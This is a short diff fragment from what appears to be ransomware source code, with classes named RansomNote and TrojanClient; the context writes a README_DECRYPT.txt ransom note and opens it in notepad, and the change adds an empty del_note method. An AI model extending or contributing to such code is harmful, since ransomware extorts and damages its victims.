@@ -109,6 +109,10 @@ class RansomNote:
         with open("README_DECRYPT.txt", "w", encoding="utf-8") as f:
             f.write(note)
         os.system("notepad README_DECRYPT.txt")
+    
+    @staticmethod
+    def del_note():
+
 
 
 class TrojanClient:
